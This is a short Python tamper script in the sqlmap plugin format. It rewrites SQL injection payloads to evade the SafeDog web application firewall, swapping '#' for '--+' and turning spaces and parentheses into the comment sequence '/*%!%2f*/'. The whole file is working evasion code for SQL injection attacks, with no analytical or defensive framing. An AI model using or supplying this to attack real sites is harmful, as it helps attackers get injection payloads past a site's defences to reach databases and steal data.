#!/usr/bin/env python

from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.LOWEST

def dependencies():
	pass

def tamper(payload, **kwargs):

	if payload:
		bypass_SafeDog_note = '--+'
		bypass_SafeDog_str = r'/*%!%2f*/'
		bypass_SafeDog_def = '/*%!%2f*/('
		payload=payload.replace('#',bypass_SafeDog_note)
		payload=payload.replace('%20',bypass_SafeDog_str)
		payload=payload.replace(' ',bypass_SafeDog_str)
		payload=payload.replace('(',bypass_SafeDog_def)

	return payload